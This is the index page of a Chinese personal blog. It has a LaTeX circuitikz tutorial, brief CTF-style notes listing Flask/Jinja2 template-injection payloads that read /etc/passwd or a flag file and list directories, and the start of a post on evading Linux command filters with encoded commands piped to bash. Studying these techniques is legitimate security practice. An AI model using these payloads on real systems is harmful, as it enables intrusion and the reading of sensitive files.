<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">


<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"garen-wang.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Garen Wang&#39;s Blog">
<meta property="og:url" content="http://garen-wang.cn/index.html">
<meta property="og:site_name" content="Garen Wang&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Garen Wang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://garen-wang.cn/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Garen Wang's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Garen Wang's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>


</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/" class="post-title-link" itemprop="url">LaTeX circuitikz简易食用指南</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-10-07 21:34:11 / Modified: 22:33:09" itemprop="dateCreated datePublished" datetime="2021-10-07T21:34:11+08:00">2021-10-07</time>
            </span>

          
            <span id="/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/" class="post-meta-item leancloud_visitors" data-flag-title="LaTeX circuitikz简易食用指南" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="写前的扯淡"><a href="#写前的扯淡" class="headerlink" title="写前的扯淡"></a>写前的扯淡</h2><p>今天下午在做电路作业，画电路把自己画累了，不想拿格子一笔一笔画电路，于是看看能不能用LaTeX来写。</p>
<p><del>就没听说过由于懒得手写作业而来用TeX画电路的，属实离谱</del></p>
<p>circuitikz是tikz的超集，是在tikz的基础上添加了专属画电路的语法内容。</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<p>不需要<code>\usepackage&#123;tikz&#125;</code>。</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><blockquote>
<p>摘自<a target="_blank" rel="noopener" href="https://www.overleaf.com/learn/latex/LaTeX_Graphics_using_TikZ%3A_A_Tutorial_for_Beginners_(Part_4">overleaf的tutorial</a>%E2%80%94Circuit_Diagrams_Using_Circuitikz)</p>
</blockquote>
<p>我们直接拿一段hello world难度的代码来分析下，看看你要写的内容表示了啥：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;</span><br><span class="line"><span class="keyword">\draw</span> (0,0) to[battery] (0,4)</span><br><span class="line">  to[ammeter] (4,4) </span><br><span class="line">  to[C] (4,0) -- (3.5,0)</span><br><span class="line">  to[lamp, *-*] (0.5,0) -- (0,0)</span><br><span class="line">(0.5,0) -- (0.5,-2)</span><br><span class="line">  to[voltmeter] (3.5,-2) -- (3.5,0)</span><br><span class="line">;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/./LaTeX-circuitikz简易食用指南/hello_world.png">
<h2 id="对hello-world的分析"><a href="#对hello-world的分析" class="headerlink" title="对hello world的分析"></a>对hello world的分析</h2><p>代码的最外层框架是这个样子：</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;</span><br><span class="line"><span class="keyword">\draw</span> (0, 0)</span><br><span class="line">&lt;your-code&gt;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<p>这里其实可以像tikz那样在里面写多个<code>\draw</code>语句，如果有很多并联电路可以自己用到。</p>
<p>每条具体的语句中有几个重点的地方：</p>
<ul>
<li><code>to</code>后面中括号可以填内容，第一个表示了元件的种类，后面的是可选参数，关于可选参数后面再分析。</li>
<li>中括号后可以紧跟一个坐标，这代表着从<strong>当前的起点</strong>到该坐标居中绘出上面指定的电路元件。</li>
<li>两个坐标可以直接用<code>--</code>来连接，这代表着用直的导线来连接这两个点。</li>
<li>在我自己认为，一个<code>\draw</code>语句最好是描述一个网孔的电路元件分布情况，如果有并联的，虽然也可以在同一个<code>\draw</code>语句中完成，不过我倾向于另起几个<code>\draw</code>来完成。</li>
</ul>
<h2 id="基本电路元件"><a href="#基本电路元件" class="headerlink" title="基本电路元件"></a>基本电路元件</h2><p>这部分是填在中括号的第一个参数中的：</p>
<ul>
<li>current source: I</li>
<li>voltage source: V</li>
<li>capacitance: C</li>
<li>voltmeter: voltmeter</li>
<li>ammeter: ammeter</li>
<li>lamp: lamp</li>
<li>resistor: R</li>
<li>battery: battery</li>
<li>wire: short</li>
</ul>
<p>电路元件自然有不同的样式风格，就比如电阻可以是一个矩形也可以是折线，一般我们通过选用american或者european来确定电路的样式。</p>
<h2 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h2><h3 id="标节点"><a href="#标节点" class="headerlink" title="标节点"></a>标节点</h3><ul>
<li><code>o-o</code>：在连线的起始段和末端都画一个空心点</li>
<li><code>*-*</code>：在连线的起始段和末端都画一个实心点</li>
<li><code>o-*</code></li>
<li><code>*-o</code></li>
</ul>
<h3 id="加样式"><a href="#加样式" class="headerlink" title="加样式"></a>加样式</h3><ul>
<li><code>l=</code></li>
<li><code>i=</code></li>
<li><code>v=</code>：一个弧线的箭头</li>
<li><code>f=</code>：一个浮在旁边的箭头，经常用来标电流，及其常用</li>
<li><code>f_=</code>：数据或者标识符通过加一个下划线可以换一边</li>
</ul>
<h3 id="加单位"><a href="#加单位" class="headerlink" title="加单位"></a>加单位</h3><ul>
<li><code>&lt;\ampere&gt;</code></li>
<li><code>&lt;\volt&gt;</code></li>
<li><code>&lt;\frad&gt;</code></li>
<li><code>&lt;\ohm&gt;</code></li>
<li><code>&lt;\kilo&gt;</code>, <code>&lt;\milli&gt;</code>, …</li>
<li>当然，传统套行内公式的方法也是可以的</li>
</ul>
<h3 id="加颜色"><a href="#加颜色" class="headerlink" title="加颜色"></a>加颜色</h3><ul>
<li><code>color=red</code></li>
</ul>
<h3 id="调大小"><a href="#调大小" class="headerlink" title="调大小"></a>调大小</h3><p>一般其实是不用调的，挤的话直接调大一点就好了，不过想调元件大小也不是不可以啦（</p>
<ul>
<li><code>\ctikzset&#123;bipoles/resistor/height=0.15&#125;</code>：斜杠分隔出若干个想调大小参数的元件名称，这一行调高</li>
<li><code>\ctikzset&#123;bipoles/resistor/width=0.4&#125;</code>：也可以调宽</li>
</ul>
<h3 id="特殊的"><a href="#特殊的" class="headerlink" title="特殊的"></a>特殊的</h3><ul>
<li><code>V&lt;=10V</code>：如果想要画的电压源的方向跟默认相反，就手动调整</li>
<li><code>f&gt;^=i</code>：在流入方向加一个箭头，标志为i</li>
</ul>
<h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>2<span class="built_in">$</span>] (0, 2) -- (0, 6)</span><br><span class="line">    to [I=<span class="built_in">$</span>i<span class="built_in">_</span>&#123;s1&#125;<span class="built_in">$</span>] (6, 6) -- (6, 2)</span><br><span class="line">    to [V&lt;=<span class="built_in">$</span>v<span class="built_in">_</span>s<span class="built_in">$</span>] (6, 0)</span><br><span class="line">    to [short, f=i] (3, 0) -- (0, 0)</span><br><span class="line">    (6, 4.5)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>1<span class="built_in">$</span>] (0, 4.5)</span><br><span class="line">    (6, 3)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>3<span class="built_in">$</span>] (3, 3) -- (2, 3)</span><br><span class="line">    to [I<span class="built_in">_</span>=<span class="built_in">$</span>i<span class="built_in">_</span>&#123;s2&#125;<span class="built_in">$</span>] (0, 3)</span><br><span class="line">    (2, 3)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>4<span class="built_in">$</span>, f&gt;<span class="built_in">^</span>=<span class="built_in">$</span>i<span class="built_in">_</span>4<span class="built_in">$</span>] (2, 0)</span><br><span class="line">    ;</span><br><span class="line">    <span class="comment">% \draw (5, 0) to [open, i=$i$] (4, 0);</span></span><br><span class="line">    <span class="comment">% \draw (2, 3) to [open, i=$i_4$] (2, 2);</span></span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/LaTeX-circuitikz简易食用指南/p35.png">
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [V=9V] (0, 4)</span><br><span class="line">    to [short] (4, 4)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (5, 4) -- (6, 4)</span><br><span class="line">    to [V&lt;=3V] (7, 4) -- (8, 4)</span><br><span class="line">    to [R=3&lt;<span class="keyword">\ohm</span>&gt;] (9, 4) -- (10, 4)</span><br><span class="line">    to [V=4V] (11, 4) -- (12, 4)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;, f&gt;<span class="built_in">^</span>=i] (12, 0) -- (0, 0)</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">\draw</span> (2, 4)</span><br><span class="line">    to [R=9&lt;<span class="keyword">\ohm</span>&gt;] (2, 0);</span><br><span class="line">    <span class="keyword">\draw</span> (3, 4)</span><br><span class="line">    to [R=3&lt;<span class="keyword">\ohm</span>&gt;] (3, 2)</span><br><span class="line">    to [I&lt;=2A] (3, 0);</span><br><span class="line">    <span class="keyword">\draw</span> (7.5, 4)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (7.5, 2)</span><br><span class="line">    to [V&lt;=10V] (7.5, 0);</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/LaTeX-circuitikz简易食用指南/p36.png">
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (0, 2) -- (0, 3)</span><br><span class="line">    to [R=1&lt;<span class="keyword">\ohm</span>&gt;] (0, 4) -- (0, 5)</span><br><span class="line">    to [short] (4, 5) -- (5, 5)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;, f&gt;=i] (8, 5)</span><br><span class="line">    to [V&lt;=10V] (8, 0) -- (0, 0)</span><br><span class="line">    (5, 0)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (5, 2) -- (5, 3)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (5, 4) -- (5, 5)</span><br><span class="line">    (0, 2.3)</span><br><span class="line">    to [I=9A] (5, 2.3)</span><br><span class="line">    ;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/LaTeX-circuitikz简易食用指南/p37.png">
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [short] (0, 6)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (3, 6)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;] (6, 6)</span><br><span class="line">    to [short] (6, 0)</span><br><span class="line">    to [V=10V] (0, 0)</span><br><span class="line">    (0, 3)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;] (3, 3)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (6, 3)</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">\draw</span></span><br><span class="line">    (3, 6) node[label=&#123;[font=<span class="keyword">\footnotesize</span>]above:a&#125;] &#123;&#125;</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>x<span class="built_in">$</span>, f=i, *-*] (3, 3) node[label=&#123;[font=<span class="keyword">\footnotesize</span>]below:b&#125;] &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/LaTeX-circuitikz简易食用指南/p38.png">
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><ul>
<li>不会就google</li>
<li>不过有时去google还不如直接翻<a target="_blank" rel="noopener" href="https://mirrors.sustech.edu.cn/CTAN/graphics/pgf/contrib/circuitikz/doc/circuitikzmanual.pdf">官方的manual</a></li>
<li>多手贱，多写，多写就会了</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">flask SSTI学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-10-04 18:18:36 / Modified: 18:33:04" itemprop="dateCreated datePublished" datetime="2021-10-04T18:18:36+08:00">2021-10-04</time>
            </span>

          
            <span id="/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/" class="post-meta-item leancloud_visitors" data-flag-title="flask SSTI学习" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/04/flask-SSTI%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>测试SSTI</p>
<p>python3读文件模板</p>
<p>普通版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>字符串翻转绕过版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;password&#39;).read()&#125;&#125; &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>listdir</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/" class="post-title-link" itemprop="url">Linux用不常用的命令绕过常用命令过滤</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-10-04 17:34:20 / Modified: 18:17:59" itemprop="dateCreated datePublished" datetime="2021-10-04T17:34:20+08:00">2021-10-04</time>
            </span>

          
            <span id="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/" class="post-meta-item leancloud_visitors" data-flag-title="Linux用不常用的命令绕过常用命令过滤" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/04/Linux%E7%94%A8%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="几个常用方法"><a href="#几个常用方法" class="headerlink" title="几个常用方法"></a>几个常用方法</h2><h3 id="定义变量然后拼接绕过"><a href="#定义变量然后拼接绕过" class="headerlink" title="定义变量然后拼接绕过"></a>定义变量然后拼接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | base64 -d | bash <span class="comment"># =&gt;cat /flag in base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p | bash <span class="comment"># =&gt;cat /flag in hex</span></span><br></pre></td></tr></table></figure>
<p>上述适用于echo没被过滤的情况</p>
